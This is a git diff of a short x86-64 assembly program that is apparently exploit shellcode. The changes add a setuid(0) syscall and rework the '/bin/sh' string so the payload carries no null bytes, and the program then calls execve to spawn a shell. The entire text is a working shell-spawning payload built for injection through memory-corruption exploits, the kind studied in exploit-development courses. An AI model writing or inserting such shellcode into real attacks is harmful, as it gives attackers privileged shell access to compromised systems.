@@ -6,6 +6,9 @@ section .text
 global _start
 
 _start:
+xor rdi, rdi
+mov al,105
+syscall
 ;clear out the registers we are going to need
 xor rax, rax
 xor rdi, rdi
@@ -13,14 +16,16 @@ xor rsi, rsi
 xor rdx, rdx
 xor rcx, rcx
 
-;//bin/sh =  2f, 2f, 62, 69, 6e, 2f, 73, 68
-;push  n i b /
-push rsi
+;load modded path to register
+mov dword ecx, 0x68732fff
+;shift to produce a null terminator
+shr ecx, 8 
+;push / b i n to stack
 push 0x6e69622f
-;push   h s / /
-mov dword [rsp+4], 0x68732f2f
+;push / s h 0 to stack
+mov dword [rsp+4], ecx
 
-;execve(path -> rdi, args -> rsi, envp -> dl)
+;execve -> rax(path -> rdi, args -> rsi, envp -> rdx)
 mov al,59
 mov rdi, rsp
 syscall
